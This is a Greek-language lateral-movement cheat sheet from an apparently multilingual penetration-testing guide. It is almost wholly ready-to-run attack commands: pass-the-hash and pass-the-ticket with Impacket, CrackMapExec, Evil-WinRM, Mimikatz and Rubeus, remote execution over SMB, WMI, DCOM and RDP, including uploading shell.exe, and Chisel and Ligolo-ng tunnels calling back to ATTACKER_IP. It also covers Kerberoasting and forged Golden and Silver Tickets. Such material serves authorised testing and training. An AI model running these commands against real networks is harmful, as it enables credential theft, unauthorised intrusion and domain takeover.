# ➡️ Φάση 4: Πλευρική μετακίνηση (Lateral Movement)

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../04-Lateral-Movement.md) • [🇮🇹 Italiano](04-Lateral-Movement.it.md) • [🇹🇷 Türkçe](04-Lateral-Movement.tr.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Στόχος:** Μετάβαση από το αρχικό σύστημα σε άλλα συστήματα του ίδιου δικτύου.

---

## Πριν ξεκινήσετε

Η **πλευρική μετακίνηση** είναι η μετάβαση σε δεύτερο σύστημα μετά την αρχική πρόσβαση. Βασίζεται σε διαθέσιμες συνδέσεις δικτύου, υπηρεσίες και κατάλληλα στοιχεία ταυτοποίησης. Το **pivoting** χρησιμοποιεί ένα ενδιάμεσο σύστημα ως διαδρομή προς δίκτυο που δεν ήταν αρχικά προσβάσιμο.

**Βασικοί όροι:** Ένα **hash** είναι σύνοψη δεδομένων· η σύνοψη ενός κωδικού δεν είναι ο ίδιος ο κωδικός ούτε απλή κρυπτογράφησή του. Το **Pass-the-Hash** χρησιμοποιεί κατάλληλη σύνοψη NTLM για ταυτοποίηση. Το **Pass-the-Ticket** χρησιμοποιεί εισιτήριο Kerberos. Το **TGT** είναι εισιτήριο που επιτρέπει την αίτηση άλλων εισιτηρίων υπηρεσίας. Το **Pass-the-Certificate** χρησιμοποιεί πιστοποιητικό και το σχετικό ιδιωτικό κλειδί.

Ένα **tunnel** διοχετεύει συνδέσεις μέσω άλλης σύνδεσης, ενώ ένας **proxy** μεσολαβεί στην επικοινωνία. Οι όροι Golden Ticket και Silver Ticket αφορούν πλαστογραφημένα εισιτήρια Kerberos με διαφορετική εμβέλεια. Η δυνατότητα χρήσης μιας τεχνικής δεν σημαίνει ότι παρέχει πρόσβαση σε κάθε υπηρεσία ή ότι δεν θα καταγραφεί.

## Περιεχόμενα

- [🔑 Μετακίνηση με στοιχεία ταυτοποίησης](#section-01)
- [🖥️ Μέθοδοι απομακρυσμένης εκτέλεσης](#section-02)
- [🔄 Πρόσβαση σε άλλο δίκτυο μέσω ενδιάμεσου συστήματος (Pivoting)](#section-03)
- [🎫 Επιθέσεις στο πρωτόκολλο Kerberos](#section-04)
- [📊 Γρήγορη αναφορά](#section-05)
- [🔗 Σχετικοί οδηγοί αναφοράς](#section-06)

<a id="section-01"></a>

## 🔑 Μετακίνηση με στοιχεία ταυτοποίησης

### Pass-the-Hash (PTH)

Χρήση σύνοψης NTLM αντί για πληκτρολόγηση του αρχικού κωδικού, σε υπηρεσίες και συνθήκες που επιτρέπουν αυτή τη μορφή ταυτοποίησης.

```bash
# Impacket PSExec με σύνοψη κωδικού (hash)
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)

Εισαγωγή ήδη διαθέσιμου εισιτηρίου Kerberos στην τρέχουσα συνεδρία, ώστε να χρησιμοποιηθεί για πρόσβαση στις υπηρεσίες που καλύπτει.

```powershell
# Εξαγωγή εισιτηρίου Kerberos από τη μνήμη με Mimikatz
sekurlsa::tickets /export

# Εισαγωγή εισιτηρίου Kerberos
kerberos::ptt ticket.kirbi

# Εναλλακτικά με Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Έλεγχος διαθέσιμων εισιτηρίων
klist
```

### Overpass-the-Hash (Pass-the-Key)

Χρήση διαθέσιμου κλειδιού ή κατάλληλης σύνοψης για την αίτηση εισιτηρίου Kerberos.

```powershell
# Mimikatz — αίτημα εισιτηρίου TGT με σύνοψη NTLM
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate

Ταυτοποίηση με πιστοποιητικό και το σχετικό ιδιωτικό κλειδί. Το αρχείο `.pfx` του παραδείγματος είναι μορφή αποθήκευσης τέτοιου υλικού.

```bash
# Χρήση πιστοποιητικού για ταυτοποίηση
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# Με Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

<a id="section-02"></a>

## 🖥️ Μέθοδοι απομακρυσμένης εκτέλεσης

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec — διαφορετικός τρόπος απομακρυσμένης εκτέλεσης, χωρίς εγγύηση μη ανίχνευσης
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM με κωδικό πρόσβασης
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM με σύνοψη κωδικού (hash)
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# Απομακρυσμένη συνεδρία PowerShell
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM

Μηχανισμός των Windows για επικοινωνία με αντικείμενα λογισμικού σε άλλο υπολογιστή. Τα παραδείγματα αφορούν την κατάχρησή του για απομακρυσμένη εκτέλεση.

```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB

Πρωτόκολλο που χρησιμοποιείται μεταξύ άλλων για κοινόχρηστα αρχεία και διαχειριστικές λειτουργίες Windows.

```bash
# Εκτέλεση εντολών με CrackMapExec
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# Αντιγραφή αρχείου μέσω SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# Εκτέλεση τύπου PsExec
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP

Πρωτόκολλο απομακρυσμένης επιφάνειας εργασίας: παρέχει γραφική πρόσβαση σε άλλο σύστημα όταν επιτρέπεται από τις ρυθμίσεις και τα δικαιώματα.

```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# Με σύνοψη NTLM και λειτουργία περιορισμένης διαχείρισης (Restricted Admin)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Παράδειγμα απομακρυσμένης ενεργοποίησης RDP
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)

Πρωτόκολλο ασφαλούς απομακρυσμένης σύνδεσης που υποστηρίζει εκτέλεση εντολών και προώθηση συνδέσεων.

```bash
# SSH με κωδικό πρόσβασης
ssh user@192.168.1.10

# SSH με κλειδί
ssh -i id_rsa user@192.168.1.10

# Διοχέτευση συνδέσεων και ενδιάμεση πρόσβαση μέσω SSH
ssh -D 9050 user@192.168.1.10  # διαμεσολαβητής SOCKS
ssh -L 8080:internal:80 user@192.168.1.10  # τοπική προώθηση θύρας
```

---

<a id="section-03"></a>

## 🔄 Πρόσβαση σε άλλο δίκτυο μέσω ενδιάμεσου συστήματος (Pivoting)

### Διοχέτευση συνδέσεων μέσω SSH (Tunneling)
```bash
# Τοπική προώθηση θύρας: πρόσβαση στο internal:80 μέσω localhost:8080
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Δυναμικός διαμεσολαβητής συνδέσεων SOCKS
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Απομακρυσμένη προώθηση θύρας
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# Στο σύστημα του ελεγκτή — ρόλος διακομιστή
./chisel server --reverse --port 8080

# Στο σύστημα-στόχο — ρόλος πελάτη
./chisel client ATTACKER_IP:8080 R:socks

# Χρήση με proxychains
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# Στο σύστημα του ελεγκτή
./proxy -selfcert

# Στο σύστημα-στόχο
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Στην κονσόλα του διαμεσολαβητή (proxy)
session
start
```

### Ενδιάμεση πρόσβαση δικτύου με Metasploit
```bash
# Προσθήκη διαδρομής μέσω συνεδρίας Meterpreter
run autoroute -s 192.168.2.0/24

# Εναλλακτική χειροκίνητη ρύθμιση
route add 192.168.2.0 255.255.255.0 1

# Διαμεσολαβητής συνδέσεων SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

<a id="section-04"></a>

## 🎫 Επιθέσεις στο πρωτόκολλο Kerberos

### Kerberoasting

Στόχος είναι η συλλογή κατάλληλων εισιτηρίων υπηρεσίας για έλεγχο της ισχύος του κωδικού του αντίστοιχου λογαριασμού εκτός σύνδεσης.

```bash
# Ανάκτηση εισιτηρίων υπηρεσίας
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Δοκιμή ανάκτησης κωδικού με Hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting

Αφορά λογαριασμούς με απενεργοποιημένη την προεπαλήθευση Kerberos. Οι προϋποθέσεις διαφέρουν από το Kerberoasting.

```bash
# Εντοπισμός χρηστών χωρίς απαίτηση προεπαλήθευσης Kerberos
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Δοκιμή ανάκτησης κωδικού
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket

Πλαστογραφημένο εισιτήριο TGT, το οποίο προϋποθέτει ήδη πρόσβαση σε ιδιαίτερα ευαίσθητο υλικό του τομέα.

```powershell
# Το παράδειγμα προϋποθέτει ήδη διαθέσιμη σύνοψη krbtgt:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket

Πλαστογραφημένο εισιτήριο για συγκεκριμένη υπηρεσία, με διαφορετική εμβέλεια από ένα Golden Ticket.

```powershell
# Δημιουργία εισιτηρίου για συγκεκριμένη υπηρεσία
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

<a id="section-05"></a>

## 📊 Γρήγορη αναφορά

### Τεχνικές πλευρικής μετακίνησης

| Τεχνική | Θύρα | Εργαλείο |
| ----------- | ------ | ------ |
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Απαιτούμενα στοιχεία και δικαιώματα πρόσβασης

| Μέθοδος | Προϋπόθεση |
| -------- | ------------- |
| Pass-the-Hash | Σύνοψη κωδικού NTLM (hash) |
| Pass-the-Ticket | Εισιτήριο ταυτοποίησης Kerberos |
| PSExec | Δικαιώματα διαχειριστή και πρόσβαση μέσω SMB |
| WinRM | Ενεργό WinRM και κατάλληλα δικαιώματα απομακρυσμένης πρόσβασης |
| RDP | Ενεργό RDP και συμμετοχή σε επιτρεπόμενη ομάδα χρηστών |

---

<a id="section-06"></a>

## 🔗 Σχετικοί οδηγοί αναφοράς

- [Impacket](../../Impacket/translations/README.el.md)
- [CrackMapExec](../../CrackMapExec/translations/README.el.md)
- [Evil-WinRM](../../Evil-WinRM/translations/README.el.md)
- [Mimikatz](../../Mimikatz/translations/README.el.md)
- [Rubeus](../../Rubeus/translations/README.el.md)

---

**Προηγούμενη φάση:** [← 03 — Κλιμάκωση προνομίων](03-Privilege-Escalation.el.md)

**Επόμενη φάση:** [05 — Διατήρηση πρόσβασης →](05-Persistence.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
